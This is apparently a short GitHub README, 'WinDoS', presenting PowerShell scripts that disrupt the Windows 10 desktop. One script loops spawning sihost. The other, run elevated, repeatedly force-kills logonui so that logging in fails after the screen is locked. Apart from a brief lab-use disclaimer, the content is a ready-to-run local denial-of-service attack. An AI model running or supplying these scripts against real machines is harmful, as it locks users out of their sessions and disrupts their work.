# WinDoS
Spawning sihost leads to unexpected behaviour in context with the Windows Desktop on Windows 10


*Please use this following PowerShell code responsibly, with caution, and in a lab environment as it could break things or lead to unexpected behaviour.*


### Temporarily disturb the Windows Desktop Environment
```PowerShell
$i = 64

while($i -ne 0){
  sihost
  $i = $i - 1
}
```
### Temporarily disturb the Windows Desktop Environment and if the User locks the computer, impair the login process (Requires elevated PowerShell instance).
```PowerShell
$i = 256

while ($i -ne 0) {
    $p = Get-Process -Name logonui -ErrorAction SilentlyContinue
    if ($p) {
        Stop-Process -Id $p.Id -Force
    }
    sihost
    $i = $i - 1
}
```


